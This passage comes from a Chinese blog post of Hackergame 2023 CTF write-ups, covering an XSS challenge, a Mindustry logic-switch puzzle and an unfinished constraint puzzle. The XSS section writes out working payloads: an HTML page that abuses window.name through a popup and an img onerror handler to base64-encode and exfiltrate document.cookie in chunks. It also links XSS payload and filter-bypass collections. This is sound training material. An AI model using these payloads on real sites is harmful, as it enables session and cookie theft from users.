<li>手动复制练习成绩并提交这件事情，也颇受同学们的差评。好像据说前后端离心（算了不管是啥了）不是这么玩的。</li>
</ol>
<p>于是今年，依旧，为了让大家熟悉符号计算软件的使用，他写了一个小网站：上面放着五道也许没那么简单的题目，只要输入题目答案，提交后就可以看到自己的分数。但是作为 2.0 版本，小 X 解决了一些已知问题，更新了若干功能：</p>
<ol>
<li>题目更难，很难手算答对；</li>
<li>支持做完题目之后给小 X 留言，感谢您宝贵的时间——对了，小 X 特地添加了字符黑名单——毕竟正常人怎么可能起 <code>&lt;img src=a onerror="alert(1)"&gt;</code> 这种名字嘛！留言的长度也做了限制，这样就算能 XSS，也只能弹个框，大概没啥实际危害吧。</li>
<li>不再需要手动提交成绩，而且小 X 决定，在这个什么比赛结束之前，他绝对不会再去打开留言页面了——只要不去看，就不会被 XSS（大概）！但是小 X 在网上冲浪的时候，还是会忍不住看其他同学写的网页——不过应该不会出问题吧，至少小 X 本人是这么想的。</li>
</ol>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10051/?token=">点击此链接访问练习网站</a></p>
<p>下面的 bot 模拟了这样一个过程：你可以提交一段 HTML 代码，bot 会在本地启动一个 HTTP 服务器，然后 bot 会访问上面的练习网站，登录后在 cookie 中加入 JavaScript 可以访问到的<strong>经过 URL encode 之后的 flag</strong>，然后访问你的站点。Bot 不会输出任何网页内容。</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10052/?token=">点击此链接与 bot 交互</a></p>
<p>为方便起见，上面的 bot 也可以通过 <code>nc 202.38.93.111 10053</code> 来连接。</p>
<blockquote>
<p>如果你不知道 <code>nc</code> 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/">萌新入门手册：如何使用 nc/ncat？</a></p>
</blockquote>
<p>点击下方的「打开/下载题目」按钮，查看程序源代码。</p>
<p>提示：</p>
<ol>
<li>完成本题不需要了解任何微积分与符号计算的知识；</li>
<li>查看去年「微积分计算小练习」一题的题解（本题题面的第一个链接），可能会对了解什么是 XSS 有所帮助；</li>
<li><strong>题目环境不与互联网连接</strong>；</li>
<li>目前主流的浏览器都不允许随意弹出窗口（popup），但是小 X 是一个很好说话的人，随便找个理由他就会允许你弹窗了；而这里这个 bot 甚至不需要理由，就会来查看你的弹窗（如果有）；</li>
<li>flag 可能会有点长。</li>
</ol>
<p><strong>补充说明 1：根据题目附件所提供源码，cookie 中的 flag 被 Python 的 <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote_plus">urllib.parse.quote_plus</a> 函数变换过。取决于解题方式，选手最终得到的 flag 可能还会被其他方法进一步编码，请注意正确解码。</strong></p>
</blockquote>
<p>微积分的页面没用的，重点是 <code>/result</code> 页面</p>
<p>尝试构造 payload </p>
<pre class="line-numbers language-none"><code class="language-none">" + document["cookie"] +"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>服务端会直接把用户输入拼接在 <code>你留下的评论：</code> 和 <code>");</code> 之间，于是可以插入自己的 js 语句。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103035509824.png"></p>
<p>但是这里过滤了一堆关键字符，而且 <code>()</code> 也给过滤了，不能闭合掉 <code>)</code> 也不能执行自己的命令，非常难受！！！</p>
<p>而且因为不能上外网，只能考虑利用自己的 session 把 bot 那边的信息 POST 评论的方式回带</p>
<p>先要访问 <code>/?token=114514%3AMiaoTonyxxx</code> 把自己的 cookie 设置上，然后 POST 回带，测试一下</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://web/?token=114514%3AMiaoTony<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miaotony<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://web/result<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>meow//<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"miaotony"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103035836679.png"></p>
<p>在本地访问 <code>/result</code> 发现成功设置！</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103035655886.png"></p>
<p>然后喵喵反复试了老半天，本来的思路是利用 iframe 或者 window.open 在一个新窗口里把 cookie 渲染到界面上，然后通过某种交互方式/中间途径去把页面上渲染出来的 cookie 读回来，在自己的页面上 CSRF 的方式 POST 到评论</p>
<p>但是发现这样都行不通，只能换一种思路了</p>
<p>那就是全部请求在弹出的窗口上进行，那就还得去执行任意的 js</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/open">MDN: Window：open() 方法</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.w3schools.com/jsref/prop_win_name.asp">w3schools: Window name</a></p>
<p>发现 <code>open(url, target)</code> 这个 <code>target</code> 有点意思，<strong>他在两个页面间共享的，可以作为中间变量来传值！</strong></p>
<blockquote>
<p><code>target</code>可选</p>
<ul>
<li>: 一个不含空格的字符串，用于指定加载资源的浏览上下文的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/name">名称</a>。如果该名称无法识别现有的上下文，则会创建一个新的上下文，并赋予指定的名称。还可以使用特殊的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a#target"><code>target</code> 关键字</a>：<code>_self</code>、<code>_blank</code>、<code>_parent</code> 和 <code>_top</code>。</li>
</ul>
<p>该名称可用作 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a#target"><code>&lt;a&gt;</code></a> 或 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form#target"><code>&lt;form&gt;</code></a> 元素的 <code>target</code> 属性。  </p>
</blockquote>
<p>先打个 payload 过去，然后先给 name 也就是 window.name 赋值</p>
<pre class="line-numbers language-none"><code class="language-none">"+name+"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后借助这个 name，因为会直接写入到 html 里，于是可以插入任意恶意的 js，当然动态写入到 html 里的 script 标签不会执行，需要用 img svg 这种通过报错等途径来执行 js</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104030129911.png"></p>
<p>可行！</p>
<p>于是构造 payload</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>comment<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token function">btoa</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里喵喵气死了，怎么页面上有两个 id 为 comment 的元素，直接用 <code>document.getElementById('comment')</code> 只能返回上面的那个 p 标签，于是试了老半天发现怎么没值返回，啊啊啊啊啊！！！</p>
<p>最后才发现怎么没给 form 里的 comment 赋值……</p>
</blockquote>
<p><code>btoa</code> 是 base64 一下防止出现奇妙字符被过滤了，后面发现果然（</p>
<p><code>slice</code> 是因为长度限制</p>
<p>然后 自己的 html</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://web/?token=114514%3AMiaoTony<span class="token punctuation">"</span></span>
        <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"&lt;img src=# onerror=\"document.forms[0].comment.value=btoa(document.cookie).slice(50,75);document.forms[0].submit();\"&gt;"</span>
        <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"http://web/result"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要多次反复打，先打 POST <code>"+name+"</code>，然后让 bot 访问，然后自己 GET 拿 flag 一部分，再改 slice 反复</p>
<p>依次得到</p>
<pre class="line-numbers language-none"><code class="language-none">ZmxhZz1mbGFnJTdCeDU1X3N0a
WxsX2FsaXZlJTI2JTNEJTNFXy
UzQytfYjllZGI1Mjc2NiU3RA=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104032627370.png"></p>
<hr>
<p>BTW，查资料的时候发现一些有意思的</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d">Penetration testing &amp; window.opener — XSS vectors part 2</a></li>
</ul>
<p>在新开页面里调用 opener.location 设置成一个新的带 hash 的值，会使原来的页面跳转到新的地址去</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104034344832.png"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.w3.org/Bugs/Public/show_bug.cgi?id=29107">Security: window.open(url, name) is vulnerable to XSS with “name” collision</a></li>
</ul>
<p>演示 demo: <a target="_blank" rel="noopener" href="http://test.attacker-domain.com/sopresearch/windowopen.html">http://test.attacker-domain.com/sopresearch/windowopen.html</a></p>
<blockquote>
<p>This is testing window.open(url, “victimFrame”) with a specific target  iframe inside of the victim’s page, and the victim is expecting the URL  opened in the target frame. Unfortunately, if the victim page is framed  with the same name (e.g. “victimFrame”) plus a javascript URL, the  window.open call would navigate the victim page itself instead of its  frame and the JavaScript is going to execute in the victim page’s domain</p>
<p>也就是说如果这个 name 冲突而且正好在外层 window 上有的话，在 iframe 里面打开一个 <code>javascript:xxx</code> URL 是会在父框架上执行 js 的</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104034614568.png"></p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/s0md3v/AwesomeXSS?tab=readme-ov-file#awesomexss">AwesomeXSS</a> 各种奇妙的 XSS payload</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://yuaneu.ro/archives/xss.html">xss的一些绕过</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2020/08/18/IDN/">从一个绕过长度限制的 XSS 中，我们能学到什么？</a></p>
<p>讲的是各种 Unicode 绕过，比如通过 <code>⑭.₨</code> 这种域名来绕过长度限制</p>
<p>查找 Unicode 网站：<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a> </p>
<p>Fuzz 工具：<a target="_blank" rel="noopener" href="https://github.com/h13t0ry/UnicodeToy?tab=readme-ov-file#unicodetoy">UnicodeToy</a>, Unicode fuzzer for various purposes</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/snad/p/17247840.html">XSS跨站脚本(XSS常用payload及绕过技巧)</a></p>
</li>
</ul>
<h2 id="异星歧途"><a href="#异星歧途" class="headerlink" title="异星歧途"></a>异星歧途</h2><blockquote>
<p>你降落在荒废星球的角落，开始新的征程，但从科技树底层一步步发展总是令人不快。幸运的是，在看似荒废的土地上仍然留存着高级文明的痕迹：你找到一台冲击反应堆——如果它工作起来，就可以获得用之不尽的电力——尽管它现在没有启动，并且控制工作条件的部件和工厂被 32 个按钮和相连的逻辑系统牢牢掌控。</p>
<p>于是：你的任务是在不进行任何其他操作的情况下拨动这 32 个按钮，使冲击反应堆能够<strong>稳定运行</strong>。</p>
<p>请点击下方的「打开/下载题目」按钮，下载题目文件。题目文件对应的 Mindustry 版本为 <a target="_blank" rel="noopener" href="https://anuke.itch.io/mindustry">7.0 Build 146</a>。打开游戏后依次选择 <strong>地图编辑器—加载地图—选择题目文件 <code>the_planet.msav</code> —返回主菜单</strong>，然后选择 <strong>开始游戏—自定义游戏—选择导入的名为 the planet 的地图—不改变任何选项点击开始游戏</strong> 。开启后的游戏界面如下图，按钮已经用红框标出：</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/the_planet_game.png"></p>
<p>将正确的按钮序列以 01 序列的形式提交至 <a target="_blank" rel="noopener" href="http://202.38.93.111:10070/?token=">检查网站</a> 或 <code>nc 202.38.93.111 10071</code> 获得 flag。按钮未按下（即游戏开始时默认状态）用 0 表示，按下（即点击按钮后按钮颜色变亮）用 1 表示，顺序从左到右。</p>
<p>提示：在游戏主菜单选择 <strong>设置—图形—显示建筑状态</strong> 可以开启建筑状态显示（即图片中建筑右下角的菱形），这可能有助于解题。</p>
<p>提示：为了完成目标，你可能需要以特定的顺序拨动这些按钮，但这不影响结果：只有唯一一组按钮组合能满足要求。如果在满足要求后再次改变按钮，冲击反应堆可能会继续运行一段时间，但会在 1-3 分钟后停止，不可能<strong>稳定运行</strong>。</p>
</blockquote>
<p>游戏源代码在 GitHub 开源: <a target="_blank" rel="noopener" href="https://github.com/Anuken/Mindustry">https://github.com/Anuken/Mindustry</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104044021220.png" alt="微型处理器"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104044120970.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104044306950.png" alt="逻辑处理器"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104044528201.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104044552681.png"></p>
<p>4个处理器，看起来就各种逻辑电路？数字电路类似物</p>
<p>感觉界面有点像 Scratch 那个图形化编程语言，不过可以点击编辑，然后导出逻辑到剪贴板</p>
<p><em>（但是还不如结合着界面上的来看</em></p>
<pre class="line-numbers language-none"><code class="language-none">sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 0 0 0
end
control enabled generator1 0 0 0 0
end


sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 0 0 0
control enabled panel1 en 0 0 0
end


set links @links
set thisLink 0
getlink currentTurret thisLink
radar player any any distance currentTurret 1 me
sensor x me @shootX
sensor y me @shootY
control shoot currentTurret x y 0 0
op add thisLink thisLink 1
jump 2 lessThan thisLink links
end


sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 0 0 0
control enabled gate1 sw2 0 0 0
op equal nsw3 sw3 0
control enabled reactor1 nsw3 0 0 0
control enabled reactor2 nsw3 0 0 0
control enabled conduit1 sw4 0 0 0
control enabled conduit2 sw4 0 0 0
control enabled mixer1 sw5 0 0 0
control enabled extractor1 sw6 0 0 0
control enabled meltdown1 sw7 0 0 0
control enabled meltdown2 sw7 0 0 0
op equal result sw8 sw9
jump 28 equal result true
control enabled mixer1 0 0 0 0
control enabled conduit2 1 0 0 0
control enabled reactor1 1 0 0 0
control enabled reactor2 1 0 0 0
control enabled conveyor2 1 0 0 0
wait 5
end


sensor t switch1 @enabled
control enabled source1 t 0 0 0
sensor t switch2 @enabled
control enabled source2 t 0 0 0
sensor t switch3 @enabled
control enabled source3 t 0 0 0
sensor t switch4 @enabled
control enabled source4 t 0 0 0
sensor t switch5 @enabled
control enabled source5 t 0 0 0
sensor t switch6 @enabled
control enabled source6 t 0 0 0
sensor t switch7 @enabled
control enabled source7 t 0 0 0
sensor t switch8 @enabled
control enabled source8 t 0 0 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> <a target="_blank" rel="noopener" href="https://mindustrygame.github.io/wiki/logic/1-glossary/">Mindustry Wiki: Logic - Glossary</a></p>
<p>手动解一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Stage 1</span>
<span class="token comment"># 10100101</span>

<span class="token comment"># Stage 2 伪代码</span>
number <span class="token operator">=</span> sw1 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">+</span> sw2 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">+</span> sw3 <span class="token operator">&lt;&lt;</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">+</span> sw8
i <span class="token operator">=</span> en <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">&gt;=</span> <span class="token number">16</span><span class="token punctuation">:</span>
<span class="token comment"># AAA:</span>
        fl1 <span class="token operator">=</span> sw1 <span class="token operator">==</span> <span class="token number">0</span>
        fl2 <span class="token operator">=</span> sw6 <span class="token operator">==</span> <span class="token number">0</span>
        fl3 <span class="token operator">=</span> fl1 <span class="token operator">|</span> fl2
        <span class="token keyword">if</span> fl3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            generator1 <span class="token operator">=</span> en
            panel1 <span class="token operator">=</span> en
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            en <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        fl0 <span class="token operator">=</span> i <span class="token operator">**</span> <span class="token number">2</span>
        <span class="token keyword">if</span> fl0 <span class="token operator">!=</span> number<span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            en <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token comment"># goto AAA</span>

<span class="token comment"># Stage 2</span>
<span class="token comment"># 12345678</span>
<span class="token comment"># 1....1..</span>
<span class="token comment"># 14*14</span>
<span class="token comment"># 11000100</span>

<span class="token comment"># Stage 3</span>
<span class="token comment"># 12345678</span>
<span class="token comment"># 10001100</span>

<span class="token comment"># Stage 4</span>
<span class="token comment"># 01110111</span>


<span class="token comment"># 10100101110001001000110001110111</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要保证冷却水和冷却液正常工作，反向溢流门不能关，不然料进不来</p>
<p>最后成功稳定运行</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104072638164.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231104072134001.png"></p>
<p><code>flag{B34WarE_0f_#xp1osi0N_xxxxx}</code></p>
<h2 id="小-Z-的谜题"><a href="#小-Z-的谜题" class="headerlink" title="小 Z 的谜题"></a>小 Z 的谜题</h2><blockquote>
<p>方程之中</p>
<p>变量如锁链相扣</p>
<p>约束交织成网</p>
<p>组合间蕴藏古老的秘密</p>
<p>在变量的森林中追寻</p>
<p>足迹遍历每一个角落</p>
<p>在约束的花丛中舞蹈</p>
<p>影子覆盖每一寸土地</p>
<p>和谐之美指引着方向</p>
<p>我们终将找到自己的答案</p>
<p><strong><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/eba3eb7b-e535-50d3-8efb-ad1cbcca7303/puzzle_of_z.py">下载题目源代码</a></strong></p>
<p>你可以通过 <code>nc 202.38.93.111 10098</code> 来连接，或者点击下面的「打开/下载题目」按钮通过网页终端与远程交互。</p>
</blockquote>
<blockquote>
<p>这段Python代码实现了一个基于约束的排列问题。以下是代码的中文解释：</p>
<ol>
<li>设定一个边界<code>bound</code>为5，这意味着在排列中的数字需要在0到5之间。</li>
<li>定义了一系列的约束条件<code>constraints</code>，每个约束包含三个数字。</li>
<li><code>count</code>数组表示每种约束需要满足的次数。</li>
<li>计算所有约束的总数<code>num_constraints</code>和每个约束的维度<code>num_dims</code>。</li>
<li>初始化一个三维数组<code>arrange</code>来存放数字排列，其结构与约束条件相符。</li>
<li>请求用户输入一个字符串<code>s</code>，该字符串由一系列数字组成。</li>
<li>使用迭代器读取用户输入的字符串，根据<code>constraints</code>的结构填充<code>arrange</code>数组。在填充过程中，如果第三个数字为2，则将其设置为-1；否则从字符串中读取数字并校验其在0到<code>bound</code>之间。</li>
<li>检查<code>arrange</code>数组是否已按特定顺序排列，如果是则通过第一阶段。</li>
<li>检查<code>arrange</code>数组中的每个元素是否至少在一个维度上与其他所有元素不重叠，如果是则通过第二阶段。</li>
<li>对于<code>arrange</code>数组中的每个元素，检查它是否满足<code>constraints</code>中定义的一个约束条件，并相应地减少<code>count</code>数组中的计数。</li>
<li>确认所有的<code>count</code>都已经减到0，如果是则通过第三阶段。</li>
<li>计算得分<code>score</code>，即在所有可能的排列中不同的(x, y, z)组合的数量。</li>
<li>根据得分<code>score</code>的值，读取并显示不同的标志信息。如果得分大于等于157，显示<code>/flag3</code>；如果得分小于等于136，显示<code>/flag2</code>；否则，显示<code>/flag1</code>。</li>
</ol>
<p>这是一个涉及到了迭代器、断言和多维数组处理的复杂脚本，主要用于验证用户输入的字符串是否能够在给定的边界和约束条件下生成一个有效的数字排列。</p>
</blockquote>
<p>想 Z3-solver 一把梭（</p>
<p>怎么一觉醒来比赛结束了，后面再补吧（呜呜</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>完结撒花！</strong></p>
<p>呜呜，可能是最后一年打 HG 啦，😹要跑路啦！</p>
<p><del>本来一堆事情说不看的怎么又来看题了</del></p>
<p>今年 rk 40 / 2386，应该比往年高（乐</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231105192858186.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/2023-11-05_19.29.17.png"></p>
